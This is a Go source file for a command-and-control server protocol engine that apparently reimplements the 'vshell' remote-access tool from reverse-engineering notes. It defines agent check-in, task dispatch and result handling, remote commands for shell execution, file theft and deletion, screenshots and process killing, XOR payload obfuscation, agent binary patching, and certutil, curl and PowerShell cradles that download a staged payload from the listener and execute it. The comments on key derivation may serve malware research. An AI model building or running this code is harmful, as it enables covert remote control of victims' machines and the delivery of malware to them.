package c2engine

import (
	"bytes"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"strings"
	"time"
)

// Protocol constants and layouts are based on the current reverse-engineering
// notes. Treat exact compatibility as unverified unless supported by fixtures
// or tests against known reference inputs and outputs.
// 
// 命令包构建器（FUN_01918400 / FUN_01918740，由控制器 DelFile/DelProcess 等
// 调用）写入固定字节序列作为协议标记：
//   FUN_01918400: 8f 97 93 8e 90 9c 47 8c 9e 94   （命令下发标记）
//   FUN_01918740: 10 f6 00 f6 0a fa ff 00 11      （命令下发标记二）
//
// 原版引擎存储类型 C7cMcwDVYi_ 的任务操作（NewTask 0x11979c0 / UpdateTask
// 0x1197d00 / DelTask 0x1197da0 / GetTask 0x1197fe0 / GetTaskByMd5Password
// 0x1197e20）；任务状态：pending/dispatched/running/completed/failed/timeout。

// Protocol serialization helpers used by the current implementation.
// The formats below describe observed or reconstructed behavior; they should
// not be read as a complete protocol specification without test evidence.
// 当前代码中的协议布局属于实现与逆向记录，未经测试验证的部分仍可能偏离样本。
// Agent → Server (Check-in):
// Agent → 服务器（签到）：
//   POST /api/checkin
//   {
//     "verify_key": "...",
//     "hostname": "...",
//     "username": "...",
//     "os": "windows|linux|darwin",
//     "process": "...",
//     "local_ip": "...",
//     "arch": "amd64|386",
//     "pid": 1234
//   }
//
// Server → Agent (Check-in response):
//   {
//     "status": "ok",
//     "client_id": 1,
//     "session_id": "sess_...",
//     "interval": 5,
//     "timeout": 30
//   }
//
// Agent → Server (Task poll):
//   GET /api/tasks?client_id=1
//
// Server → Agent (Tasks):
//   {
//     "tasks": [
//       {"id": 1, "command": "whoami", "timeout": 30}
//     ],
//     "interval": 5
//   }
//
// Agent → Server (Result):
//   POST /api/result
//   {
//     "client_id": 1,
//     "command_id": 1,
//     "result": "...",
//     "status": "completed|failed|timeout"
//   }

// ============================================================================
// Protocol message types
// ============================================================================
// CheckinRequest is the agent registration/reconnection message.
type CheckinRequest struct {
	VerifyKey   string `json:"verify_key"`
	HostName    string `json:"hostname"`
	UserName    string `json:"username"`
	OsName      string `json:"os"`
	ProcessName string `json:"process"`
	LocalIP     string `json:"local_ip"`
	Arch        string `json:"arch,omitempty"`
	PID         int    `json:"pid,omitempty"`
	Version     string `json:"version,omitempty"`
}
// CheckinResponse is the server's response to agent check-in.
type CheckinResponse struct {
	Status    string `json:"status"`
	ClientID  int64  `json:"client_id"`
	SessionID string `json:"session_id"`
	Interval  int    `json:"interval"` // task poll interval in seconds
	Timeout   int    `json:"timeout"`  // connection timeout in seconds
	Message   string `json:"message,omitempty"`
}
// TaskRequest is the agent's task polling request.
type TaskRequest struct {
	ClientID int64 `json:"client_id"`
}
// TaskResponse wraps pending tasks for an agent.
type TaskResponse struct {
	Tasks    []TaskItem `json:"tasks"`
	Interval int        `json:"interval"`
}
// TaskItem is a single command to execute.
type TaskItem struct {
	ID      int64  `json:"id"`
	Command string `json:"command"`
	Timeout int    `json:"timeout"`
}
// ResultRequest is the agent's task result submission.
//
// VerifyKey proves the caller knows the listener key; the listener rejects
// results without it when the listener has a key set.
type ResultRequest struct {
	ClientID  int64  `json:"ClientID"`
	CommandID int64  `json:"CommandID"`
	Result    string `json:"Result"`
	Status    string `json:"Status"` // completed, failed, timeout
	VerifyKey string `json:"VerifyKey,omitempty"`
}
// ResultResponse acknowledges receipt.
type ResultResponse struct {
	Status   string `json:"status"`
	Received bool   `json:"received"`
}

// ============================================================================
// Encryption helpers
// ============================================================================
// GenerateEncryptSalt creates a random encryption salt.
func GenerateEncryptSalt() string {
	b := make([]byte, 16)
	rand.Read(b)
	return hex.EncodeToString(b)
}
// FrameSaltKey derives the message-frame AES key from a listener salt.
//
// 证据分级（重要）：gdb 断点（session 537）抓到的是 **硬证据** —— AES 密钥
// 寄存器 RDX 为 32 字节 ASCII 缓冲 "ceb20772e0c9d240c75eb26b0e37abee"。
// 但 0x56f480 这个地址**未能在 Ghidra 中确认为 crypto/aes.NewCipher 调用点**，
// 且该地址来自 gdb 日志、其 Ghidra 对应关系从未建立（本次会话中 Ghidra 曾
// 退出，多次函数/xref 查询当时是对着已死服务做的）——静态侧仍未定位。
// 注意：包的字符串是存在的（crypto/aes、crypto/cipher、"NewGCM" 都有），
// garble 只打乱 **符号名**：函数名被渲染成 "包.(*类型).方法" 形式，例如
// cipher 的 GCM 类型出现为 Ip3jZB1cm.(*bq0m8kYa).NewGCM / .NonceSize /
// .Overhead / .Seal / .Open（名字池 blob，file 0x6c04e5c = VA 0x06c0585c）。
// 但可搜索 ≠ 可定位：该 blob 是 funcnametab 大字符串、无 xref（已确认），
// 且 crypto/aes|cipher 的整组方法名在二进制里出现 40 余次（每次构建/拷贝各
// 一份），无法区分哪一份是消息帧的调用者。构造点因此仍不可静态定位。
//
// 推导结果（"salt" 的 md5，文本即密钥字节）：
//
//	md5("salt") = ceb20772e0c9d240c75eb26b0e37abee   （encoding/hex 文本 → AES-256）
//
// "salt" 是长度 ≤ 4 的全部可打印 ASCII 串中唯一具有该摘要的原像，对应面板
// 字段「流量加密盐」（listeners.EncryptSalt）。该 32 字符文本按原样作为密钥
// 字节；16 字节原始摘要与零填充摘要均无法通过 tag 校验（agent 侧
// TestMsgKeyBothInterpretationsInScope）。
//
// AEAD 参数是**由捕获帧穷举搜索建立**，而非从二进制读出：在所有候选
// （nonce 长度 8–20、nonce 偏移 0–4、AAD ∈ {无, nonce}、tag 长度 8–20）中
// 只有唯一一个能通过校验 —— nonce 12、偏移 0、无 AAD、tag 16，即
// cipher.NewGCM 默认值。见 TestFrameCapturedShape。
func FrameSaltKey(salt string) []byte {
	sum := md5.Sum([]byte(salt))
	out := make([]byte, hex.EncodedLen(len(sum)))
	hex.Encode(out, sum[:])
	return out
}
// FrameEncrypt wraps and encrypts a payload in the agent's transport frame:
//
//	wire  = <u32 LE len><frame>
//	frame = [12B nonce][ciphertext][16B tag]   (AES-256-GCM)
//
// 与 agent/message_wire.go 的 encryptFrame 逐字节一致（密钥 = FrameSaltKey(salt)）。
func FrameEncrypt(plaintext []byte, salt string) ([]byte, error) {
	gcm, err := newFrameGCM(salt)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	frame := append(nonce, gcm.Seal(nil, nonce, plaintext, nil)...)
	out := make([]byte, 4+len(frame))
	binary.LittleEndian.PutUint32(out[:4], uint32(len(frame)))
	copy(out[4:], frame)
	return out, nil
}
// FrameDecrypt parses and decrypts an agent transport frame, validating the
// 4-byte little-endian length header.
func FrameDecrypt(wire []byte, salt string) ([]byte, error) {
	if len(wire) < 4 {
		return nil, fmt.Errorf("frame too short")
	}
	n := int(binary.LittleEndian.Uint32(wire[:4]))
	if n != len(wire)-4 {
		return nil, fmt.Errorf("wire length mismatch: header %d, body %d", n, len(wire)-4)
	}
	return Unframe(wire[4:], salt)
}
// Unframe opens a frame body without the length header.
func Unframe(frame []byte, salt string) ([]byte, error) {
	gcm, err := newFrameGCM(salt)
	if err != nil {
		return nil, err
	}
	if len(frame) < gcm.NonceSize()+gcm.Overhead() {
		return nil, fmt.Errorf("frame too short")
	}
	nonce := frame[:gcm.NonceSize()]
	return gcm.Open(nil, nonce, frame[gcm.NonceSize():], nil)
}
// newFrameGCM builds the message-frame AEAD from a salt.
func newFrameGCM(salt string) (cipher.AEAD, error) {
	block, err := aes.NewCipher(FrameSaltKey(salt))
	if err != nil {
		return nil, err
	}
	return cipher.NewGCM(block)
}

// ============================================================================
// Message encoding/decoding
// ============================================================================
//
// REMOVED 2026-09-13: DeriveKey, AESEncrypt, AESDecrypt, EncodeMessage and
// DecodeMessage. They formed a self-referential base64/AES envelope with a
// sha256(salt+":"+verifyKey) key that no decompiled function computes — an
// early reimplementation invention. All five were production-orphaned (only
// this file and proto_e2e_test.go referenced them, which tested the encoder
// against itself); the check-in and result handlers use FrameDecrypt above.
// Do not reintroduce a key derivation here without a traced original.

// ============================================================================
// Payload compression
// ============================================================================
// CompressPayload compresses a payload with gzip.
func CompressPayload(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	if _, err := w.Write(data); err != nil {
		return nil, err
	}
	if err := w.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// DecompressPayload decompresses a gzip-compressed payload
func DecompressPayload(data []byte) ([]byte, error) {
	r, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	defer r.Close()
	return io.ReadAll(r)
}

// ============================================================================
// Payload obfuscation (for agent binary delivery)
// ============================================================================

// XorEncode XOR-encodes a payload with a key
func XorEncode(data []byte, key byte) []byte {
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ key
	}
	return result
}

// XorEncodeWithKey XOR-encodes with a multi-byte key
func XorEncodeWithKey(data []byte, key []byte) []byte {
	result := make([]byte, len(data))
	for i := range data {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

// ============================================================================
// Session management
// ============================================================================

// GenerateSessionID creates a unique session identifier
func GenerateSessionID(listenerID int64) string {
	b := make([]byte, 8)
	rand.Read(b)
	return fmt.Sprintf("sess_%d_%x_%d", listenerID, b, time.Now().UnixNano())
}

// GenerateClientToken creates a unique client authentication token
func GenerateClientToken(clientID int64, verifyKey string) string {
	h := md5.Sum([]byte(fmt.Sprintf("%d:%s:%d", clientID, verifyKey, time.Now().UnixNano())))
	return hex.EncodeToString(h[:])
}

// ============================================================================
// Payload generation (staged payload URLs)
// ============================================================================

// GenerateStagedURL creates the URL for a staged payload download
func GenerateStagedURL(listenerAddr, mode string) string {
	// Map mode to URL path
	paths := map[string]string{
		AgentTypeStage:     "/swt",
		AgentTypeStageless: "/sww",
		AgentTypeShellcode: "/sws",
		AgentTypeDLL:       "/swd",
		AgentTypeListen:    "/swl",
		AgentTypeListenDLL: "/swld",
	}

	path, ok := paths[mode]
	if !ok {
		path = "/swt"
	}

	return fmt.Sprintf("http://%s%s", listenerAddr, path)
}

// ============================================================================
// Command encoding for agent dispatch
// ============================================================================

// Command types that can be sent to agents
const (
	CmdShell      = "shell"      // Execute shell command
	CmdUpload     = "upload"     // Upload file to agent
	CmdDownload   = "download"   // Download file from agent
	CmdSleep      = "sleep"      // Change sleep interval
	CmdExit       = "exit"       // Terminate agent
	CmdScreenshot = "screenshot" // Take screenshot
	CmdScreen     = "screen"     // Start screen streaming
	CmdFileList   = "filelist"   // List directory
	CmdFileDelete = "filedelete" // Delete file
	CmdFileMove   = "filemove"   // Move/rename file
	CmdFileTouch  = "filetouch"  // Create empty file
	CmdFileMkdir  = "filemkdir"  // Create directory
	CmdFileCat    = "filecat"    // Read file contents
	CmdFileEdit   = "fileedit"   // Edit file
	CmdDiskInfo   = "diskinfo"   // Get disk information
	CmdPS         = "ps"         // Process list
	CmdKill       = "kill"       // Kill process
	CmdProxy      = "proxy"      // Start proxy/tunnel
	CmdProxyStop  = "proxystop"  // Stop proxy/tunnel
	CmdPlugin     = "plugin"     // Execute plugin
)

// EncodeShellCommand creates a shell command task payload
func EncodeShellCommand(command string, timeout int) string {
	data, _ := json.Marshal(map[string]interface{}{
		"type":    CmdShell,
		"command": command,
		"timeout": timeout,
	})
	return string(data)
}

// EncodeFileListCommand creates a directory listing task payload
func EncodeFileListCommand(path string) string {
	data, _ := json.Marshal(map[string]interface{}{
		"type": CmdFileList,
		"path": path,
	})
	return string(data)
}

// EncodeFileUploadCommand creates a file upload task payload
func EncodeFileUploadCommand(remotePath string, data []byte) string {
	encoded := base64.StdEncoding.EncodeToString(data)
	payload, _ := json.Marshal(map[string]interface{}{
		"type": CmdUpload,
		"path": remotePath,
		"data": encoded,
	})
	return string(payload)
}

// EncodeFileDownloadCommand creates a file download task payload
func EncodeFileDownloadCommand(remotePath string) string {
	data, _ := json.Marshal(map[string]interface{}{
		"type": CmdDownload,
		"path": remotePath,
	})
	return string(data)
}

// EncodeScreenshotCommand creates a screenshot task payload
func EncodeScreenshotCommand() string {
	data, _ := json.Marshal(map[string]interface{}{
		"type": CmdScreenshot,
	})
	return string(data)
}

// ============================================================================
// Utility functions
// ============================================================================

// BuildAgentDownloadCommand generates the certutil download command for Windows agents
func BuildAgentDownloadCommand(listenerAddr, mode string) string {
	url := GenerateStagedURL(listenerAddr, mode)
	return fmt.Sprintf(
		`certutil.exe -urlcache -split -f %s C:\Users\Public\run.bat && C:\Users\Public\run.bat`,
		url,
	)
}

// BuildLinuxAgentDownloadCommand generates the curl download command for Linux agents
func BuildLinuxAgentDownloadCommand(listenerAddr, mode string) string {
	url := GenerateStagedURL(listenerAddr, mode)
	return fmt.Sprintf(
		`curl -s %s -o /tmp/run && chmod +x /tmp/run && /tmp/run`,
		url,
	)
}

// BuildPowershellDownloadCommand generates a PowerShell download cradle
func BuildPowershellDownloadCommand(listenerAddr, mode string) string {
	url := GenerateStagedURL(listenerAddr, mode)
	return fmt.Sprintf(
		`powershell -c "IWR %s -OutFile $env:TEMP\run.exe; & $env:TEMP\run.exe"`,
		url,
	)
}

// ============================================================================
// Platform-specific build info
// ============================================================================

// AgentBuildInfo holds information for building agent binaries
type AgentBuildInfo struct {
	Platform  string `json:"platform"`
	Arch      string `json:"arch"`
	Mode      string `json:"mode"`   // stage/stageless/shellcode/dll/listen/listen_dll
	Format    string `json:"format"` // exe/elf/dll/so/bin
	Extension string `json:"extension"`
	MimeType  string `json:"mime_type"`
}

// GetBuildInfo returns build information for a platform/arch/mode combination
func GetBuildInfo(platform, arch, mode string) *AgentBuildInfo {
	info := &AgentBuildInfo{
		Platform: platform,
		Arch:     arch,
		Mode:     mode,
	}

	switch mode {
	case AgentTypeDLL, AgentTypeListenDLL:
		if platform == PlatformWindows {
			info.Format = "dll"
			info.Extension = ".dll"
		} else {
			info.Format = "so"
			info.Extension = ".so"
		}
	case AgentTypeShellcode:
		info.Format = "bin"
		info.Extension = ".bin"
	default:
		if platform == PlatformWindows {
			info.Format = "exe"
			info.Extension = ".exe"
		} else {
			info.Format = "elf"
			info.Extension = ""
		}
	}

	switch info.Format {
	case "exe", "dll":
		info.MimeType = "application/x-msdownload"
	case "elf", "so":
		info.MimeType = "application/x-executable"
	default:
		info.MimeType = "application/octet-stream"
	}

	return info
}

// ============================================================================
// OSS upload (for storing agent binaries on external OSS/CDN)
// ============================================================================

// OSSConfig holds configuration for OSS/cloud storage
type OSSConfig struct {
	URL       string `json:"url"`
	Bucket    string `json:"bucket"`
	AccessKey string `json:"access_key"`
	SecretKey string `json:"secret_key"`
	Region    string `json:"region"`
}

// UploadToOSS simulates uploading an agent binary to OSS/CDN
func UploadToOSS(data []byte, filename string, config *OSSConfig) (string, error) {
	if config == nil || config.URL == "" {
		return "", fmt.Errorf("OSS not configured")
	}

	// In the original binary, this would upload to Alibaba OSS,
	// Tencent COS, AWS S3, or a custom HTTP endpoint.
	// For the reimplementation, we store locally.
	url := strings.TrimRight(config.URL, "/") + "/" + filename
	Logf("OSS upload: %s (%d bytes) → %s", filename, len(data), url)
	return url, nil
}

// ============================================================================
// Binary patching utilities (for embedding configuration in agents)
// ============================================================================

// PatchAgentBinary embeds configuration into an agent binary template
func PatchAgentBinary(template []byte, config map[string]string) ([]byte, error) {
	// In the original binary, this replaces placeholder values
	// in pre-compiled agent templates.
	// The placeholders are typically long random strings that are easy to find.

	result := make([]byte, len(template))
	copy(result, template)

	for placeholder, value := range config {
		if len(value) > len(placeholder) {
			value = value[:len(placeholder)]
		}
		// Pad value to placeholder length
		padded := []byte(value)
		for len(padded) < len(placeholder) {
			padded = append(padded, 0)
		}

		idx := bytes.Index(result, []byte(placeholder))
		if idx >= 0 {
			copy(result[idx:idx+len(placeholder)], padded)
		}
	}

	return result, nil
}

// ============================================================================
// Binary template constants (magic numbers for patching)
// ============================================================================

const (
	// Placeholder patterns in agent templates (these would be replaced at build time)
	PlaceholderServerAddr  = "REPLACE_SERVER_ADDR___XXXXXXXXXXXXXXXXXXXXXXXX"
	PlaceholderVerifyKey   = "REPLACE_VERIFY_KEY___XXXXXXXXXXXXXXXXXXXXXXXX"
	PlaceholderEncryptSalt = "REPLACE_ENCRYPT_SALT_XXXXXXXXXXXXXXXXXXXXXXXX"
	PlaceholderProxyAddr   = "REPLACE_PROXY_ADDR___XXXXXXXXXXXXXXXXXXXXXXXX"
	PlaceholderDNSServer   = "REPLACE_DNS_SERVER___XXXXXXXXXXXXXXXXXXXXXXXX"
	PlaceholderCDNURL      = "REPLACE_CDN_URL______XXXXXXXXXXXXXXXXXXXXXXXX"

	// Agent payload marker (identifies agent binary)
	AgentMagic = 0x56474E54 // "VGNT" = vshell agent
)

// ReadMagic reads and validates the agent magic number
func ReadMagic(data []byte) bool {
	if len(data) < 4 {
		return false
	}
	return binary.LittleEndian.Uint32(data[:4]) == AgentMagic
}

// WriteMagic writes the agent magic number to a payload
func WriteMagic(data []byte) {
	binary.LittleEndian.PutUint32(data[:4], AgentMagic)
}
